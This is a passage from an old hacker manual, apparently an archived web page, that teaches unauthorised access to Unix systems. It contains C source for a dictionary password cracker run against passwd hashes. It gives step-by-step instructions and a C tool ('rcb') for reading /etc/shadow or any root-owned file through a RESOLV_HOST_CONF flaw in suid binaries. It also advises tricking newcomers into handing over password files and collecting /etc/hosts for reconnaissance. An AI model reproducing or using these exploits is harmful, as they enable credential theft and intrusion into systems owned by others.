<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fprintf( stderr, "Couldnt find dict file\n"
);
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit(1);
<BR>&nbsp;&nbsp; }
<BR>&nbsp;&nbsp; while ( fgets( buff, 80, fp ) != NULL )
<BR>&nbsp;&nbsp; {
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; setpwent();
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; buff[strlen(buff)-1]='\0';
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; while ( ( pwd = getpwent() ) != NULL )
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if ( strcmp( (*pwd).pw_passwd,
"*" ) != 0 &amp;&amp;
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ( strlen(
(*pwd).pw_passwd ) == 13 ) )
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; get_salt(salt,
(*pwd).pw_passwd );
<BR>
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; encrypted_string
= crypt( buff, salt );
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if ( strcmp(
encrypted_string, (*pwd).pw_passwd ) == 0 )
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
fprintf( stdout, "l: %s p: %s\n", (*pwd).pw_name, buff);
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
fflush(stdout);
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }
<BR>&nbsp;&nbsp; }
<BR>}
<BR>!
<BR>&nbsp;&nbsp; echo "Creating scrack"
<BR>&nbsp;&nbsp; cc -O6 -fomit-frame-pointer -s -o scrack scrack.c
<BR>fi
<BR>
<BR>./scrack /tmp/messages.dict.$$
<BR>
<BR>echo /tmp/messages.dict.$$, ./scrack, and ./scrack.c still exist, delete
them yourself.
<BR>
<BR>------ cut here
<BR>
<BR>
<BR><A NAME="Newbe's"></A><B><FONT SIZE=+1>Newbe's</FONT></B>&nbsp;
<BR>
<BR>Yup, again, just another place to get password files.&nbsp; Just follow
the guide
<BR>lines in <A HREF="ch2.htm#Talking To Newbe's">section 2</A>.&nbsp; Use
your sly ideas and get out there and make some
<BR>lame friends ;)
<BR>
<BR>Remember you could have been a lammer before you read this manual &lt;G>rin
<BR>
<BR>-----------------------------
<BR>
<BR><A NAME="Getting Shadow passwd Files"></A><B><FONT SIZE=+1>Getting Shadow
passwd Files</FONT></B>&nbsp;
<BR>
<BR>
<BR>What is a shadow password file?
<BR>
<BR>Lets just use the passwd file above to show you what it would look like
to you
<BR>if you cat it.
<BR>
<BR>root:x:0:0:root:/root:/bin/bash
<BR>bin:x:1:1:bin:/bin:
<BR>daemon:x:2:2:daemon:/sbin:
<BR>adm:x:3:4:adm:/var/adm:
<BR>lp:x:4:7:lp:/var/spool/lpd:
<BR>sync:x:5:0:sync:/sbin:/bin/sync
<BR>shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
<BR>halt:x:7:0:halt:/sbin:/sbin/halt
<BR>mail:x:8:12:mail:/var/spool/mail:
<BR>news:x:9:13:news:/usr/lib/news:
<BR>uucp:x:10:14:uucp:/var/spool/uucppublic:
<BR>operator:x:11:0:operator:/root:/bin/bash
<BR>games:x:12:100:games:/usr/games:
<BR>man:x:13:15:man:/usr/man:
<BR>postmaster:x:14:12:postmaster:/var/spool/mail:/bin/bash
<BR>nobody:x:-2:100:nobody:/dev/null:
<BR>ftp:x:404:1::/home/ftp:/bin/bash
<BR>guest:x:405:100:guest:/dev/null:/dev/null
<BR>bhilton:x:501:100:Bob Hilton:/home/bhilton:/bin/bash
<BR>web:x:502:100:Web Master:/home/web:/bin/bash
<BR>mary:x:503:100:Mary C. Hilton:/home/mary:/bin/bash
<BR>
<BR>Something missing?&nbsp; Yup, the encrypted passwords.&nbsp; If you get
root access the
<BR>encrypted passwords are in /etc/shadow.&nbsp; Some admin's will hide the
shadow file
<BR>in some weird directory somewhere, but most of the time you will find it
right
<BR>in /etc.&nbsp; Other shadow programs might put it in a master.passwd file.&nbsp;
But if
<BR>you get root just have a good look around.
<BR>
<BR>Lets say you have an account on the machine and just can't get root access.
<BR>
<BR>Not a problem if they are using libc 5.4.7, at this time most still are
;)
<BR>Also one of these files have to have suid perm's (no prob):
<BR>
<BR>ping, traceroute, rlogin, or, ssh
<BR>
<BR>1. Type bash or sh to start a bash shell
<BR>2. Type: export RESOLV_HOST_CONF=/etc/shadow
<BR>3. Type one of the file names above with asdf, like this:
<BR>
<BR>ping asdf
<BR>
<BR>It should cat the passwd shadow file for you if it works.
<BR>I seem to find it working on most of the systems i am going on these days.
<BR>
<BR>Note: you can replace /etc/shadow with any root owned file you want to
read.
<BR>
<BR>Here is a quick script you can run on any file you want to make it easy:
<BR>
<BR>rcb.c
<BR>-------- cut here
<BR>
<BR>/* RCB Phraser - therapy in '96
<BR>&nbsp;* Limits: Linux only, no binary files.
<BR>&nbsp;* little personal message to the world: FUCK CENSORSHIP!
<BR>&nbsp;*/
<BR>
<BR>#include &lt;stdio.h>
<BR>
<BR>void getjunk(const char *filetocat)
<BR>{ setenv("RESOLV_HOST_CONF",filetocat,1);
<BR>&nbsp; system("ping xy 1> /dev/null 2> phrasing");
<BR>&nbsp; unsetenv("RESOLV_HOST_CONF");
<BR>}
<BR>
<BR>void main(argc,argv)
<BR>int argc; char **argv;
<BR>{ char buffer[200];
<BR>&nbsp; char *gag;
<BR>&nbsp; FILE *devel;
<BR>&nbsp;
<BR>&nbsp; if((argc==1) || !(strcmp(argv[1],"-h")) || !(strcmp(argv[1],"--help")))
<BR>&nbsp; { printf("RCB Phraser - junked by THERAPY\n\n");
<BR>&nbsp;&nbsp;&nbsp; printf("Usage: %s [NO OPTIONS] [FILE to cat]\n\n",argv[0]);
<BR>&nbsp;&nbsp;&nbsp; exit(1);
<BR>&nbsp; }
<BR>&nbsp; getjunk(argv[1]);
<BR>&nbsp; gag=buffer;
<BR>&nbsp; gag+=10;
<BR>&nbsp; devel=fopen("phrasing","rb");
<BR>&nbsp; while(!feof(devel))
<BR>&nbsp; { fgets(buffer,sizeof(buffer),devel);
<BR>&nbsp;&nbsp;&nbsp; if(strlen(buffer)>24)
<BR>&nbsp;&nbsp;&nbsp; { strcpy(buffer+strlen(buffer)-24,"\n");
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fputs(gag,stdout);
<BR>&nbsp;&nbsp;&nbsp; }
<BR>&nbsp; }
<BR>&nbsp; fclose(devel);
<BR>&nbsp; remove("phrasing");
<BR>}
<BR>
<BR>-------------- cut here
<BR>
<BR>command line : rcb /etc/shadow&nbsp; or any other file on the system you
<BR>can't read ;)
<BR>
<BR>
<BR><A NAME="Getting"></A><B><FONT SIZE=+1>Getting /etc/hosts</FONT></B>&nbsp;
<BR>
<BR>
<BR>Just a precaution, sometimes you will need to know what other systems
<BR>are in the hosts file, or what are all of the ip addresses or different
domains
<BR>on the system.&nbsp; Make sure to cat the /etc/hosts file for more information
<BR>you might need later.

<BR>
<CENTER><A HREF="http://www.atomicfrog.com/archives/">Back to
Index</a></CENTER>
</BODY>
</HTML>
